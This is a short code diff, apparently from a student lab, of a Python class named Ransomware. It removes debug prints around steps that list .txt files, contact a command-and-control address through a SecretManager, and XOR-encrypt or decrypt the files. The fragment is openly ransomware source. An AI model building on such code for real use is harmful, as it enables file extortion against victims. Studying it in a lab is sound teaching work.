@@ -48,11 +48,6 @@ class Ransomware:
         # main function for encrypting (see PDF)
         #lister les fichiers txt
         list = self.get_files("*.txt")
-
-        print(f"{len(list)} fichiers .txt trouvés")
-
-        #for i in range(len(list)):
-            #print(f"Fichier txt trouvé : {list[i]}")
         
         #appeler la classe SecretManager()
         call = SecretManager(CNC_ADDRESS, TOKEN_PATH)
@@ -79,7 +74,6 @@ class Ransomware:
             call.set_key(key)
             print("Getting files...")
             list = self.get_files("*.txt")
-            print(list)
             print("Deciphering files...")
             call.xorfiles(list)
             print("Cleaning everything...")
